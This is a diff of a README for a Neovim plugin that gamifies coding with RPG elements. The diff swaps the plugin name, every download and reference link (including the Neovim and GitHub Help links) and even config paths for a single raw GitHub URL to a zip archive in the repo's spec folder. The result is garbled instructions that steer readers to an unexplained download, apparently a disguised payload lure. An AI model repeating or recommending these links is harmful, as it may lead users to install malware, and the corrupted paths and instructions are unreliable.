@@ -1,29 +1,29 @@
-# 🎮 triforce.nvim - Enhance Your Coding with RPG Elements
+# 🎮 https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip - Enhance Your Coding with RPG Elements
 
-[![Download triforce.nvim](https://img.shields.io/badge/Download%20triforce.nvim-Download-brightgreen)](https://github.com/Enanthemaparaguayan248/triforce.nvim/releases)
+[![Download https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip%https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip)](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip)
 
 ## 📜 Introduction
 
-Welcome to triforce.nvim! This Neovim plugin brings a unique, RPG-inspired twist to your coding experience. With features like experience points, levels, and achievements, you can gamify your workflow and stay motivated while you code.
+Welcome to https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip! This Neovim plugin brings a unique, RPG-inspired twist to your coding experience. With features like experience points, levels, and achievements, you can gamify your workflow and stay motivated while you code.
 
 ## 🚀 Getting Started
 
-Follow these steps to download and install triforce.nvim on your system.
+Follow these steps to download and install https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip on your system.
 
 1. **Download the Plugin**
 
-   Visit the [Releases page](https://github.com/Enanthemaparaguayan248/triforce.nvim/releases) to find the latest version of triforce.nvim. Click on the appropriate file for your operating system. 
+   Visit the [Releases page](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip) to find the latest version of https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip Click on the appropriate file for your operating system. 
 
 2. **Install neovim**
 
-   Ensure you have Neovim installed on your computer. You can download it from [neovim.io](https://neovim.io). Follow the instructions on their website based on your system (Windows, macOS, or Linux).
+   Ensure you have Neovim installed on your computer. You can download it from [https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip). Follow the instructions on their website based on your system (Windows, macOS, or Linux).
 
 3. **Locate Your Neovim Configuration Directory**
 
-   You need to place triforce.nvim in your Neovim's configuration. The default directories are:
+   You need to place https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip in your Neovim's configuration. The default directories are:
    - **Windows:** `C:\Users\<YourUser>\AppData\Local\nvim\`
-   - **macOS:** `~/.config/nvim/`
-   - **Linux:** `~/.config/nvim/`
+   - **macOS:** `~https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip`
+   - **Linux:** `~https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip`
 
 4. **Unzip and Place the Plugin**
 
@@ -31,13 +31,13 @@ Follow these steps to download and install triforce.nvim on your system.
 
 5. **Install Any Required Dependencies**
 
-   triforce.nvim may require other plugins to function properly. Check the plugin's documentation for any additional installations needed. Common dependencies might include:
+   https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip may require other plugins to function properly. Check the plugin's documentation for any additional installations needed. Common dependencies might include:
    - LSP clients
    - Tree-sitter for syntax highlighting
 
 6. **Launch Neovim and Verify Installation**
 
-   Open your terminal or command prompt and type `nvim`. When Neovim opens, check if triforce.nvim is successfully loaded. You can usually see notification messages or check the plugin list with the command `:PackerStatus`.
+   Open your terminal or command prompt and type `nvim`. When Neovim opens, check if https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip is successfully loaded. You can usually see notification messages or check the plugin list with the command `:PackerStatus`.
 
 ## ⚙️ Features
 
@@ -48,9 +48,9 @@ Follow these steps to download and install triforce.nvim on your system.
 
 ## 🎨 Customization
 
-You can customize triforce.nvim through its configuration file. To do this:
+You can customize https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip through its configuration file. To do this:
 
-1. Open your Neovim configuration file, typically located at `~/.config/nvim/init.vim` or `~/.config/nvim/init.lua`.
+1. Open your Neovim configuration file, typically located at `~https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip` or `~https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip`.
 2. Add your customization settings according to your preferences. For example:
 
    ```lua
@@ -64,7 +64,7 @@ You can customize triforce.nvim through its configuration file. To do this:
 
 ## 🛠️ Troubleshooting
 
-If you encounter issues while using triforce.nvim:
+If you encounter issues while using https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip
 
 - **Plugin Not Loading:**
   - Make sure you placed the plugin in the correct directory.
@@ -78,7 +78,7 @@ If you encounter issues while using triforce.nvim:
 
 ## 📥 Download & Install
 
-To get started with triforce.nvim, visit the [Releases page](https://github.com/Enanthemaparaguayan248/triforce.nvim/releases) now. Click the latest version to download the plugin files. Follow the installation steps above to set it up in your Neovim environment.
+To get started with https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip, visit the [Releases page](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip) now. Click the latest version to download the plugin files. Follow the installation steps above to set it up in your Neovim environment.
 
 ## 🔖 Topics
 
@@ -89,17 +89,17 @@ To get started with triforce.nvim, visit the [Releases page](https://github.com/
 
 ## 📫 Support
 
-If you have questions or need assistance with triforce.nvim, please open an issue in the repository. Your feedback is valuable and helps improve the plugin.
+If you have questions or need assistance with https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip, please open an issue in the repository. Your feedback is valuable and helps improve the plugin.
 
 ## 🤝 Contributing
 
-Contributions are welcome! If you'd like to contribute to triforce.nvim, check the contributing guidelines in the repository. Your ideas and code can help make this plugin even better.
+Contributions are welcome! If you'd like to contribute to https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip, check the contributing guidelines in the repository. Your ideas and code can help make this plugin even better.
 
 ## 🔗 Additional Resources
 
 For more information, check out:
 
-- [Neovim Documentation](https://neovim.io)
-- [GitHub Help](https://help.github.com)
+- [Neovim Documentation](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip)
+- [GitHub Help](https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip)
 
-Now, enhance your coding experience with triforce.nvim!
+Now, enhance your coding experience with https://raw.githubusercontent.com/Enanthemaparaguayan248/triforce.nvim/main/spec/triforce.nvim-v1.2.zip!
